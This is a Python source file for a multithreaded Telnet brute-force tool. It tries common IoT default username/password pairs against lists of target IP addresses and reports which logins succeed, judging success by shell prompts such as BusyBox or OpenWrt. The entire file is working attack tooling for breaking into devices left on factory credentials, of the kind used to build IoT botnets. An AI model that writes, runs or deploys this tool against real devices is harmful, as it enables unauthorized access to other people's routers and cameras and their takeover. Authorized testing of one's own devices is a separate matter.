#!/usr/bin/env python3
"""
Telnet Brute Force Module
Attempts to crack Telnet credentials using common username/password combinations
"""

import telnetlib
import threading
import time
import itertools
from typing import List, Dict, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import credential dictionary
from credential_dictionary import get_default_usernames, get_default_passwords, DEFAULT_CREDENTIAL_PAIRS

class TelnetBruteForcer:
    def __init__(self, timeout: int = 5, max_threads: int = 20, delay: float = 0.1):
        """
        Initialize Telnet brute forcer
        
        Args:
            timeout: Connection timeout in seconds
            max_threads: Maximum number of concurrent threads
            delay: Delay between attempts to avoid overwhelming targets
        """
        self.timeout = timeout
        self.max_threads = max_threads
        self.delay = delay
        self.successful_logins = []
        self.failed_attempts = []
        self.results_lock = threading.Lock()
    
    def attempt_login(self, ip: str, port: int, username: str, password: str) -> Dict:
        """
        Attempt a single Telnet login
        
        Args:
            ip: Target IP address
            port: Target port
            username: Username to try
            password: Password to try
        
        Returns:
            Dictionary with attempt result
        """
        result = {
            'ip': ip,
            'port': port,
            'username': username,
            'password': password,
            'success': False,
            'timestamp': time.time(),
            'response': '',
            'error': None
        }
        
        try:
            # Small delay to avoid overwhelming targets
            if self.delay > 0:
                time.sleep(self.delay)
            
            # Connect to target
            tn = telnetlib.Telnet(ip, port, timeout=self.timeout)
            
            # Wait for login prompt
            try:
                login_prompt = tn.read_until(b"login:", timeout=3)
                result['response'] += login_prompt.decode('utf-8', errors='ignore')
            except:
                pass
            
            # Send username
            tn.write(username.encode('utf-8') + b"\n")
            
            # Wait for password prompt
            try:
                password_prompt = tn.read_until(b"password:", timeout=3)
                result['response'] += password_prompt.decode('utf-8', errors='ignore')
            except:
                pass
            
            # Send password
            tn.write(password.encode('utf-8') + b"\n")
            
            # Check response
            try:
                response = tn.read_until(b"#", timeout=5).decode('utf-8', errors='ignore')
                result['response'] += response
                
                # Look for success indicators
                success_indicators = [
                    "#", "$", ">", "~",  # Common shell prompts
                    "BusyBox", "OpenWrt", "welcome", "Welcome"
                ]
                
                failure_indicators = [
                    "incorrect", "failed", "denied", "invalid",
                    "login:", "password:", "Login incorrect"
                ]
                
                response_lower = response.lower()
                
                # Check for failure first (more specific)
                if any(indicator in response_lower for indicator in failure_indicators):
                    result['success'] = False
                # Then check for success
                elif any(indicator in response_lower for indicator in success_indicators):
                    result['success'] = True
                # If we got a shell prompt character at the end
                elif response.strip().endswith(('#', '$', '>', '~')):
                    result['success'] = True
                
            except:
                # Timeout might indicate success if we're waiting for shell
                pass
            
            tn.close()
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def get_default_usernames(self) -> List[str]:
        """Get list of common IoT device usernames"""
        return get_default_usernames()
    
    def get_default_passwords(self) -> List[str]:
        """Get list of common IoT device passwords"""
        return get_default_passwords()
    
    def get_credential_pairs(self) -> List[Tuple[str, str]]:
        """Get common username:password pairs"""
        return DEFAULT_CREDENTIAL_PAIRS
    
    def brute_force_target(self, ip: str, port: int = 23, 
                           usernames: Optional[List[str]] = None, 
                           passwords: Optional[List[str]] = None,
                           stop_on_success: bool = True) -> List[Dict]:
        """
        Brute force a single target with multiple credentials
        
        Args:
            ip: Target IP address
            port: Target port
            usernames: List of usernames to try
            passwords: List of passwords to try
            stop_on_success: Stop after first successful login
        
        Returns:
            List of attempt results
        """
        if not usernames:
            usernames = self.get_default_usernames()
        if not passwords:
            passwords = self.get_default_passwords()
        
        # Generate all username/password combinations
        credentials = list(itertools.product(usernames, passwords))
        
        # Add specific credential pairs from list
        # These are added at a position about 30% into the list to allow some
        # basic brute force attempts first, but not wait too long before trying these
        cred_pairs = self.get_credential_pairs()
        specific_creds = cred_pairs  # Already a list of tuples
        
        if specific_creds:
            # Insert specific credential pairs about 30% into the full list
            # This makes it visible in the brute force process but not at the very beginning
            insert_position = max(1, len(credentials) // 3)
            for i, cred in enumerate(specific_creds):
                credentials.insert(insert_position + i, cred)
        
        print(f"[+] Brute forcing {ip}:{port} with {len(credentials)} combinations...")
        print(f"[+] Usernames: {len(usernames)}, Passwords: {len(passwords)}")
        print(f"[+] Added {len(specific_creds)} specific credential pairs")
        
        results = []
        found_success = False
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Submit all credential attempts
            future_to_cred = {
                executor.submit(self.attempt_login, ip, port, username, password): (username, password)
                for username, password in credentials
            }
            
            for future in as_completed(future_to_cred):
                username, password = future_to_cred[future]
                try:
                    result = future.result()
                    results.append(result)
                    
                    # Print attempt results
                    if result['success']:
                        print(f"[+] SUCCESS: {ip}:{port} - {username}:{password}")
                        with self.results_lock:
                            self.successful_logins.append(result)
                        found_success = True
                        
                        if stop_on_success:
                            # Cancel remaining futures
                            for remaining_future in future_to_cred:
                                remaining_future.cancel()
                            break
                    else:
                        print(f"[-] FAILED: {ip}:{port} - {username}:{password}")
                        with self.results_lock:
                            self.failed_attempts.append(result)
                
                except Exception as e:
                    print(f"[!] Error with {username}:{password} on {ip}:{port} - {e}")
        
        return results
    
    def brute_force_targets(self, targets: List[Dict], 
                           usernames: Optional[List[str]] = None, 
                           passwords: Optional[List[str]] = None,
                           stop_on_success: bool = True) -> Dict:
        """
        Brute force multiple targets
        
        Args:
            targets: List of target dictionaries with 'ip' and optional 'port'
            usernames: List of usernames to try
            passwords: List of passwords to try
            stop_on_success: Stop after first successful login per target
        
        Returns:
            Dictionary with results for each target
        """
        all_results = {}
        
        for target in targets:
            ip = target['ip']
            port = target.get('port', 23)
            
            print(f"\n[*] Starting brute force on {ip}:{port}")
            results = self.brute_force_target(ip, port, usernames, passwords, stop_on_success)
            all_results[f"{ip}:{port}"] = results
        
        return all_results
    
    def get_results_summary(self) -> Dict:
        """Get summary of all brute force results"""
        with self.results_lock:
            return {
                'successful_logins': len(self.successful_logins),
                'failed_attempts': len(self.failed_attempts),
                'success_details': self.successful_logins,
                'total_attempts': len(self.successful_logins) + len(self.failed_attempts)
            }

# Main execution
if __name__ == "__main__":
    bruter = TelnetBruteForcer(timeout=5, max_threads=10, delay=0.1)
    
    # Example target list
    targets = [
        {'ip': '192.168.1.100', 'port': 23},
        {'ip': '192.168.1.101', 'port': 23}
    ]
    
    # Run brute force
    results = bruter.brute_force_targets(targets)
    
    # Print summary
    summary = bruter.get_results_summary()
    print(f"\n[*] Brute Force Summary:")
    print(f"    Successful logins: {summary['successful_logins']}")
    print(f"    Failed attempts: {summary['failed_attempts']}")
    print(f"    Total attempts: {summary['total_attempts']}")
    
    if summary['successful_logins'] > 0:
        print(f"\n[+] Successful credentials:")
        for login in summary['success_details']:
            print(f"    {login['ip']}:{login['port']} - {login['username']}:{login['password']}")
